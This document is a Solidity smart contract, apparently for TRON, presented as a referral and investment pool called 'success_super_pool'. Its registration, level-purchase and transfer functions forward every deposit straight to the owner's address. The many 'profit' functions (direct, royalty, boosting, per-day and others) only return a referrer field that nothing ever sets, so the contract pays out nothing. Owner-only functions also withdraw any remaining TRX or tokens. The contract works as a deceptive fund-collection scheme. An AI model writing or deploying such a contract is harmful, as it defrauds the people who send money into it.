//SourceUnit: successsuperpool.sol

pragma solidity 0.5.10;

interface  IERC20 {
    
    
    function transfer(address recipient, uint256 amount) external returns (bool);
}


contract success_super_pool {
    
    event Transfer(address to,uint256 amount,uint256 balance);
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
    }
    mapping(address => User) public users;
    address  public   owner;
    constructor(address ownerAddress) public {
        owner = ownerAddress;
        
    }

    function transfer() public payable  returns(bool){
      
        address(uint256(owner)).transfer(msg.value);
        emit Transfer(owner,msg.value,address(this).balance);
        return   true;
     }

    function registrationExt() external payable {
        
        address(uint256(owner)).transfer(msg.value);
        emit Transfer(owner,msg.value,address(this).balance);
        }
    function buyNewLevel() external payable {
        
        address(uint256(owner)).transfer(msg.value);
        emit Transfer(owner,msg.value,address(this).balance);
      }    
    function direct_profit(address userAddress) public view returns(address) {
       return users[userAddress].referrer;
    }
    
    function autopool_profit(address userAddress) public view returns(address) {
       return users[userAddress].referrer;
    }
        
    function devident_profit(address userAddress) public view returns(address) {
       return users[userAddress].referrer;
    }

   function royalty_profit(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }
    function perday_five_direct_profit(address userAddress) public view returns(address) {
       return users[userAddress].referrer;
    }

    function level_profit(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }
    
    function boosting_profit(address userAddress) public view returns(address) {
    return users[userAddress].referrer;
        
    }
    
    function per_day_five_profit(address userAddress) public view returns(address) {
return users[userAddress].referrer;
        
    }
    
    function ssp_slot_profit(address userAddress) public view returns(address) {
   return users[userAddress].referrer;
   }
    
     modifier onlyOwner() {
    require(owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }
    
 function rescueTRX(uint256 _value)  external   onlyOwner returns(bool){
      
        address(uint256(owner)).transfer(_value);
        emit Transfer(owner,_value,address(this).balance);
        return   true;
     }
  
    function withdrawToken(address _tokenContract, uint256 _amount) external onlyOwner {
        IERC20 tokenContract = IERC20(_tokenContract);
        
        // transfer the token from address of this contract
        // to address of the user (executing the withdrawToken() function)
        tokenContract.transfer(msg.sender, _amount);
    }
    
    
    
}